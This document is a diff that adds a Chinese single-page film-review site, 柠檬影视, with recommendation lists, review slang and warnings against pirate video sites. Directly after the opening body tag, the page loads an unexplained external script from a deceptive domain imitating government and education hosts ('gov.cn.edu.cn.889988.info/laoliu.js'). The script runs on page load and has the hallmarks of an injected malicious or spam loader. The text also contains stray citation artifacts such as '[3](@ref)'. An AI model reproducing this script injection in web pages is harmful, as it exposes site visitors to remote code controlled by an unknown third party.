@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>柠檬影视 - 酸片鉴片台 · 酸甜涩片单/醒神榜/柠檬黑话/水果影视盗版避雷 | ningmengyingshi-h5.github.io</title>
+<meta name="description" content="柠檬影视，酸片鉴片台风单页：柠檬黄、青柠绿、酸橙青、辣椒红、深夜墨绿。酸片别看、甜片放心嗑、涩片能忍、冰镇经典、柠檬醒神榜、水果名影视站避雷。官网 https://ningmengyingshi-h5.github.io">
+<meta name="keywords" content="柠檬影视, 酸片, 甜片, 涩片, 鉴片台, 柠檬醒神榜, 柠檬影院避雷, 柠檬追剧避雷, 水果影视盗版">
+<meta name="author" content="柠檬影视">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#10231a">
+<style>
+:root{
+  --bg:#10231a;--bg2:#163024;--panel:#1c3a29;--line:rgba(155,227,107,.32);
+  --lemon:#ffe14d;--lime:#9be36b;--peel:#f7ffe9;--sour:#39e0c8;--chili:#ff5a4d;--ink:#eafff0;--muted:#9fc7ad;
+  --mono:Consolas,Menlo,monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:62px}
+body{
+  background:
+    radial-gradient(560px 320px at 86% -8%,rgba(255,225,77,.16),transparent),
+    radial-gradient(520px 320px at -8% 6%,rgba(57,224,200,.14),transparent),
+    linear-gradient(180deg,#10231a,#163024 60%,#0b1a13);
+  color:var(--ink);font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;line-height:1.9;
+}
+a{color:var(--lemon);text-decoration:none}
+.bar{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;padding:10px 16px;border-bottom:2px solid var(--lime);background:rgba(16,35,26,.93);backdrop-filter:blur(8px)}
+.logo b{font-family:var(--mono);font-size:18px;color:var(--lime);letter-spacing:1px}
+.logo span{display:block;font-size:9px;letter-spacing:5px;color:var(--muted);font-family:var(--mono)}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:5px 9px;border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--ink)}
+.nav a:hover{border-color:var(--lemon);color:var(--lemon)}
+.hero{max-width:1040px;margin:0 auto;padding:52px 20px 24px;position:relative;text-align:center;overflow:hidden}
+.slice{position:absolute;inset:0;z-index:0;background:radial-gradient(420px 220px at 50% 120%,rgba(255,90,77,.14),transparent)}
+.hero .inner{position:relative;z-index:2}
+.kicker{font-family:var(--mono);font-size:12px;color:var(--sour);letter-spacing:2px}
+.hero h1{font-size:32px;margin:8px 0 6px;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--lemon)}
+.hero p{color:var(--muted);max-width:720px;margin:0 auto 12px;font-size:15px}
+.hero .url{display:inline-block;font-family:var(--mono);font-size:13px;background:var(--panel);border:1px dashed var(--lime);color:var(--lime);padding:7px 14px;border-radius:999px}
+.metrics{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:16px}
+.metrics div{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:10px 14px;min-width:104px}
+.metrics b{display:block;font-size:18px;color:var(--chili);font-family:var(--mono)}
+.metrics small{color:var(--muted);font-size:12px}
+.wrap{max-width:1060px;margin:0 auto;padding:16px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:26px 0 14px;border-bottom:2px solid var(--lime);padding-bottom:6px}
+.sec h2{font-size:20px;font-weight:900}
+.sec h2 b{color:var(--sour)}
+.sec small{color:var(--muted);font-size:12px;font-family:var(--mono)}
+.sec .chip{margin-left:auto;font-size:11px;color:#10231a;background:var(--lemon);padding:3px 10px;border-radius:999px;font-weight:800}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.card{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:18px 18px 18px 4px;padding:14px;position:relative;transition:.2s}
+.card:hover{transform:translateY(-4px);border-color:var(--lemon)}
+.card .tag{position:absolute;top:-10px;left:12px;font-family:var(--mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:800;color:#10231a}
+.tag.sour{background:var(--chili);color:#fff}
+.tag.sweet{background:var(--lime)}
+.tag.astringent{background:var(--sour)}
+.tag.ice{background:var(--peel);color:#10231a}
+.card .ico{font-size:24px;margin-top:6px}
+.card h3{font-size:15px;margin:4px 0 2px}
+.card p{font-size:12px;color:var(--muted)}
+.card .why{margin-top:8px;font-size:12px;color:var(--peel);font-family:var(--mono)}
+.list{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:16px;margin-top:14px}
+.list li{list-style:none;padding:10px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink)}
+.list li:last-child{border-bottom:none}
+.list b{color:var(--lemon);font-family:var(--mono)}
+.vocab{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-top:14px}
+.vcard{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px}
+.vcard h4{font-size:14px;color:var(--lime);font-family:var(--mono);margin-bottom:4px}
+.vcard p{font-size:12px;color:var(--muted)}
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:var(--bg2);border:1px solid var(--line);color:var(--lime);padding:2px 7px;border-radius:6px;font-family:var(--mono)}
+.warn{margin-top:12px;background:rgba(255,90,77,.12);border:1px solid rgba(255,90,77,.45);border-radius:12px;padding:12px 14px;color:#ffd2cc;font-size:13px;font-family:var(--mono)}
+.foot{text-align:center;padding:24px 20px;border-top:2px solid var(--lime);color:var(--muted);font-size:12px;font-family:var(--mono)}
+@media(max-width:820px){.grid{grid-template-columns:1fr 1fr}.vocab{grid-template-columns:1fr}}
+@media(max-width:540px){.grid{grid-template-columns:1fr}.hero h1{font-size:25px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>柠檬影视</b><span>SOUR FILM TASTING ROOM</span></div>
+  <nav class="nav">
+    <a href="#home">鉴片台</a>
+    <a href="#sour">酸片</a>
+    <a href="#sweet">甜片</a>
+    <a href="#ast">涩片</a>
+    <a href="#ice">冰镇经典</a>
+    <a href="#wake">醒神榜</a>
+    <a href="#slang">柠檬黑话</a>
+    <a href="#avoid">水果影视避雷</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="slice"></div>
+  <div class="inner">
+    <span class="kicker">// lemon.taste({ mode:"sour-first", spoiler:false, parse:false })</span>
+    <h1>柠檬影视 · <em>酸片鉴片台</em></h1>
+    <p>不是“柠檬影视免费高清/柠檬影院/柠檬追剧”。这是咬一口柠檬再看片的地方：酸片先预警、甜片放心嗑、涩片别硬吹、经典冰镇后再上。名字酸，标准更酸。</p>
+    <div class="url">https://ningmengyingshi-h5.github.io</div>
+    <div class="metrics">
+      <div><b>酸/甜/涩</b><small>三味鉴片法</small></div>
+      <div><b>冰镇区</b><small>影史常青</small></div>
+      <div><b>0 资源</b><small>只鉴不存</small></div>
+      <div><b>index,follow</b><small>必应友好</small></div>
+    </div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="sour">
+    <h2>🍋 酸片区 · <b>咬一口直接皱眉</b></h2><small>sour</small><span class="chip">能劝退就劝退</span>
+  </div>
+  <div class="grid">
+    <div class="card"><span class="tag sour">酸</span><div class="ico">🤢</div><h3>流量堆出来的“爆款”</h3><p>热搜当剧本，反转当味精，男女主对视三秒就吻。</p><div class="why">why:数据好看，人物像 AI 拼的</div></div>
+    <div class="card"><span class="tag sour">酸</span><div class="ico">🧊</div><h3>五毛特效古偶</h3><p>绿幕穿帮、威亚晃成秋千、群演眼神在找盒饭。</p><div class="why">why:服化道 PPT 化</div></div>
+    <div class="card"><span class="tag sour">酸</span><div class="ico">📣</div><h3>营销比正片长</h3><p>预告剪出 8 个名场面，成片里只出现 12 秒。</p><div class="why">why:买热搜＞买剧本</div></div>
+  </div>
+
+  <div class="sec" id="sweet">
+    <h2>🍯 甜片区 · <b>放心嗑，不烧脑</b></h2><small>sweet</small><span class="chip">下班续命</span>
+  </div>
+  <div class="grid">
+    <div class="card"><span class="tag sweet">甜</span><div class="ico">🍓</div><h3>校园慢恋</h3><p>自行车、纸条、下雨共一把伞，糖不齁。</p><div class="why">pick:《举重妖精金福珠》</div></div>
+    <div class="card"><span class="tag sweet">甜</span><div class="ico">🧁</div><h3>职场轻喜剧</h3><p>老板不疯、同事不降智、加班有尽头。</p><div class="why">pick:《非常律师禹英禑》</div></div>
+    <div class="card"><span class="tag sweet">甜</span><div class="ico">🍵</div><h3>治愈慢综式电影</h3><p>做饭、赶集、修房子、养猫，剧情散但人舒服。</p><div class="why">pick:《海街日记》</div></div>
+  </div>
+
+  <div class="sec" id="ast">
+    <h2>🫒 涩片区 · <b>能忍，但别吹神作</b></h2><small>astringent</small><span class="chip">主观预警</span>
+  </div>
+  <div class="grid">
+    <div class="card"><span class="tag astringent">涩</span><div class="ico">🎭</div><h3>文艺闷片</h3><p>镜头美、节奏慢、字幕读完一页戏还没动。</p><div class="why">适合：失眠夜 / 考据党</div></div>
+    <div class="card"><span class="tag astringent">涩</span><div class="ico">🧩</div><h3>故弄玄虚悬疑</h3><p>谜底揭开会心一笑，也可能“就这？”。</p><div class="why">适合：二刷找伏笔</div></div>
+    <div class="card"><span class="tag astringent">涩</span><div class="ico">🎙️</div><h3>台词大于剧情</h3><p>金句满屏，但人物动机像在念演讲稿。</p><div class="why">适合：摘文案 / 不做深度</div></div>
+  </div>
+
+  <div class="sec" id="ice">
+    <h2>🧊 冰镇经典 · <b>放十年还是凉的</b></h2><small>ice-cold classics</small><span class="chip">闭眼入</span>
+  </div>
+  <div class="grid">
+    <div class="card"><span class="tag ice">冰</span><div class="ico">🕳️</div><h3>肖申克的救赎</h3><p>希望是好事，也许是最好的事。</p><div class="why">9.7 · 越压抑越解渴</div></div>
+    <div class="card"><span class="tag ice">冰</span><div class="ico">🎭</div><h3>霸王别姬</h3><p>人戏不分，一生一台戏。</p><div class="why">9.6 · 华语天花板级</div></div>
+    <div class="card"><span class="tag ice">冰</span><div class="ico">🌌</div><h3>楚门的世界</h3><p>如果人生是综艺，你什么时候发现摄像机？</p><div class="why">9.3 · 现在看更瘆人</div></div>
+    <div class="card"><span class="tag ice">冰</span><div class="ico">🚲</div><h3>天堂电影院</h3><p>电影是别人的人生，影院是自己的童年。</p><div class="why">9.2 · 怀旧党圣片</div></div>
+    <div class="card"><span class="tag ice">冰</span><div class="ico">🪐</div><h3>2001太空漫游</h3><p>看不懂也震撼，黑石一摆就是神。</p><div class="why">8.9 · 冰镇后更玄</div></div>
+    <div class="card"><span class="tag ice">冰</span><div class="ico">🌇</div><h3>爱乐之城</h3><p>爱与野心，结尾那一段够醒神。</p><div class="why">8.4 · 甜里带涩</div></div>
+  </div>
+
+  <div class="sec" id="wake">
+    <h2>🍋 柠檬醒神榜 · <b>昏昏沉沉时看这些</b></h2><small>wake-up list</small><span class="chip">酸度拉满</span>
+  </div>
+  <ul class="list">
+    <li><b>《疯狂的石头》</b> —— 多线乱撞、方言互啄，烂片后遗症一秒治好。</li>
+    <li><b>《让子弹飞》</b> —— 台词密度高，看完不想看注水剧。</li>
+    <li><b>《杀手没有假期》</b> —— 黑色幽默，温柔和血一起上。</li>
+    <li><b>《untouchable / 触不可及》</b> —— 笑完鼻酸，比鸡汤有用。</li>
+    <li><b>《心灵奇旅》</b> —— 一片披萨、一片叶子都能把人叫醒。</li>
+    <li><b>《万力追凶 / 边境杀手》</b> —— 节奏像被人拎着后领走，不困。</li>
+  </ul>
+
+  <div class="sec" id="slang">
+    <h2>🗣️ 柠檬黑话 · <b>鉴片人嘴里的暗号</b></h2><small>lemon slang</small><span class="chip">别当豆瓣评分看</span>
+  </div>
+  <div class="vocab">
+    <div class="vcard"><h4>酸度 9.0</h4><p>不是评分低，是“浪费时间还恶心人”：滤镜、霸总、重生、复仇全塞一锅。</p></div>
+    <div class="vcard"><h4>糖精片</h4><p>甜得发苦，CP 是靠剪辑硬凑出来的，原片两人没同框几秒。</p></div>
+    <div class="vcard"><h4>冰镇神作</h4><p>十年前看哭、十年后看还是哭，不靠热搜活着的片子。</p></div>
+    <div class="vcard"><h4>柠檬醒神</h4><p>专门用来把“刚被烂片腌入味”的脑子冲干净。</p></div>
+    <div class="vcard"><h4>涩口文艺</h4><p>不是烂，是你今天状态不对；睡一觉再看会升 1 分。</p></div>
+    <div class="vcard"><h4>果皮白</h4><p>片单里最安全的那类：不神不烂，通勤、吃饭、哄睡都能放。</p></div>
+  </div>
+
+  <section class="list" id="avoid" style="margin-top:22px">
+    <h3 style="font-size:17px;color:var(--chili);font-family:var(--mono);margin-bottom:8px">🚫 水果影视避雷 · 搜“柠檬影视”别踩这些</h3>
+    <li><b>“柠檬影视免费高清/柠檬影院/柠檬追剧 APP”</b> —— 桔子、柚子、柠檬、芒果类名字常换皮，核心套路是“免费 VIP → 充值 → 内容消失”。[3](@ref)</li>
+    <li><b>“刚上映大片 柠檬版 4K 秒更”</b> —— 院线没下画就 4K，基本枪版/录屏/转码。</li>
+    <li><b>“专属解码器/专用播放器下载”</b> —— 正常网页播放不需要先装来源不明 EXE/APK。[6](@ref)</li>
+    <li><b>“加群拿终身会员 99 元”</b> —— 个人收款+微信群，第二天群名变带货群。</li>
+    <li><b>“万能解析/任何视频都能放”</b> —— 第三方解析站，版权与隐私双雷区。</li>
+  </section>
+
+  <section class="list about" style="margin-top:18px">
+    <h3 style="font-size:17px;color:var(--lime);font-family:var(--mono);margin-bottom:8px">🍋 关于 柠檬影视</h3>
+    <p><strong style="color:var(--lime)">柠檬影视</strong> 是“酸片鉴片台 / 柠檬醒神厅”：柠檬黄、青柠绿、果皮白、酸橙青、辣椒红、深夜墨绿。做酸/甜/涩三味鉴片、冰镇经典、醒神榜、柠檬黑话、水果名影视站避雷。<strong style="color:var(--chili)">只鉴片、排片、避坑，不存片、不解析第三方源、不提供下载。</strong></p>
+    <p>官网：<code>https://ningmengyingshi-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>看片请走正版院线、授权流媒体、电视台回看、公共版权片库。名字带水果 ≠ 正版片库，认准官网域名，别被“柠檬/桔子/柚子影视”的酸甜味骗进盗版场。[3,9](@ref)</p>
+    <div class="warn">⚠️ 咬一口柠檬：看到“柠檬影视免费看全集”先眯眼——真柠檬酸嘴，假柠檬盗号。</div>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 柠檬影视 · ningmengyingshi-h5.github.io · 片可以酸，来源要正 · 甜片别嗑过量，酸片别硬咽 🍋
+</footer>
+
+</body>
+</html>
